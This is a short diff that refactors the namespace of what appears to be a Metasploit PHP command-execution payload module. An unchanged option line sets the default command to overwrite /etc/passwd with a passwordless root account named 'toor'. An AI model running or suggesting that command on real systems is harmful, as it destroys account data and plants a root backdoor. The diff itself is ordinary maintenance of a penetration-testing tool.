@@ -15,12 +15,8 @@ require 'msf/core/payload/php'
 require 'msf/core/handler/bind_tcp'
 require 'msf/base/sessions/command_shell'
 
-module Msf
-module Payloads
-module Singles
-module Php
 
-module Exec
+module Metasploit3
 
 	include Msf::Payload::Single
 	include Msf::Payload::Php
@@ -38,7 +34,7 @@ module Exec
 		register_options(
 			[
 				OptString.new('CMD', [ true, "The command string to execute", 'echo "toor::0:0:::/bin/bash">/etc/passwd' ]),
-			], Msf::Payloads::Singles::Php::Exec)
+			], self.class)
 	end
 
 	def php_exec_cmd
@@ -63,4 +59,4 @@ module Exec
 
 end
 
-end end end end
+   
